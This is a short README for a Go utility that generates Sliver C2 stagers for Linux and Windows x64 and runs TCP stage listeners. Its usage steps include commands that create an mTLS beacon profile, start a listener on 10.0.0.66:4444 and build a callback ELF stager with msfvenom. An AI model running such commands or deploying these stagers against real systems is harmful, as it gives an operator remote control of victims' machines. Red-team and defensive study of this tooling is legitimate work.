# Sliver Stage Helper

A utility tool that assists with the creation and management of stagers for the [Sliver](https://github.com/BishopFox/sliver) Command & Control (C2) framework.

## Overview

Sliver Stage Helper provides functionality to:

- Generate stagers for different operating systems and architectures (current is linux/Windows x64)
- Start sliver stage listener (current: is TCP)

## Features

a solution for https://github.com/BishopFox/sliver/issues/1734

## Usage

To use the Sliver Stage Helper library in your Go project:

```bash
go install github.com/Esonhugh/sliver-stage-helper@latest
```


1. (sliver) profiles new beacon --mtls 10.0.0.66:6789  -o linux --arch amd64 linux64_profile
2. (sliver) mtls -l 6789
3. export SLIVER_CLIENT_CONFIG=~/.sliver-client/configs/op.json
2. sliverStager startListen -p linux64_profile -l tcp://10.0.0.66:4444
3. sliverStager stagerOne -l tcp://10.0.0.66:4444 -f elf -o 1.elf 

## Requirements

- Go 1.23.5 or higher
- Sliver C2 Framework (for server operations) and an operator config
- msfvenom in PATH
